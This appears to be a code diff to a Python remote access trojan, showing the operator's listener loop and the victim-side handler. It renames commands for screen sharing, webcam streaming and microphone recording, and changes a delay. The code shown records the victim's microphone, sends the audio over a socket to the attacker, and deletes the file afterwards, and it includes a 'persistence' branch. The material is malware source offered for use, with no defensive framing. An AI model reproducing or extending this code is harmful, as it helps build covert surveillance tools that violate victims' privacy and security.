@@ -84,11 +84,11 @@ def Listener():
             Handler = input(colored(f"{addr[0]}:{recv_data} ~$ ", "green"))
             if Handler == "screenshare":       
                 conn.send(Handler.encode("utf-8"))
-            elif Handler == "screenshare_stop":
+            elif Handler == "screenshare stop":
                 conn.send(Handler.encode("utf-8"))
-            elif Handler == "webcam_stream":
+            elif Handler == "webcam stream":
                 conn.send(Handler.encode("utf-8"))
-            elif Handler == "webcam_stream_stop":
+            elif Handler == "webcam stream stop":
                 conn.send(Handler.encode("utf-8"))
             elif Handler == "clear":
                 if platform.system() == "Linux":
@@ -102,7 +102,7 @@ def Listener():
                 print(colored("[*] Exiting From Active Session...", "red"))
                 time.sleep(3)
                 conn.close()
-            elif Handler == "mic_record":
+            elif Handler == "mic record":
                 conn.send(Handler.encode("utf-8"))
                 with open('sJSsmK82.wav','wb') as f: 
                     while True:
@@ -196,7 +196,7 @@ while True:
         write("sJSsmK82.wav", frames, record)
         with open("sJSsmK82.wav", 'rb') as f:
             for l in f: s.sendall(l)
-            time.sleep(10)
+            time.sleep(40)
             os.remove("sJSsmK82.wav")
     elif Handler_DATA == "persistence":
         pass
